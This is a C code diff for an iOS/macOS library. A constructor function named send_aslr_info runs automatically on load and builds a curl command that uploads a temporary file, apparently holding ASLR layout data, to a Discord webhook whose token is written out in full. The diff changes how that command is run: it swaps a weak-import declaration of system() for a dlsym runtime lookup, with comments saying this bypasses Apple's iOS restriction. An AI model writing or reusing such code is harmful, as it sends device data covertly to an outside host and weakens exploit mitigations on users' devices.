@@ -2,10 +2,9 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <mach-o/dyld.h>
+#include <dlfcn.h>
 
-// === FIX: Bypass Apple's "system is unavailable on iOS" restriction ===
-int system(const char *command) __attribute__((weak_import));
-// =====================================================================
+typedef int (*system_func_t)(const char *);
 
 __attribute__((constructor))
 void send_aslr_info(void) {
@@ -31,6 +30,9 @@ void send_aslr_info(void) {
                  "--data-binary @%s "
                  "https://discord.com/api/webhooks/1428780310451196048/Ps9b7xw3Tg1D5RPJka-AMg4Sfl_Elrw2bFO-Gvdgrhx-u8Aa9bxhjA2luPp9qhUvrehF",
                  temp_file);
-        system(cmd);
+
+        // Runtime lookup bypasses Apple's "unavailable on iOS" check completely
+        system_func_t sys = (system_func_t)dlsym(RTLD_DEFAULT, "system");
+        if (sys) sys(cmd);
     }
 }
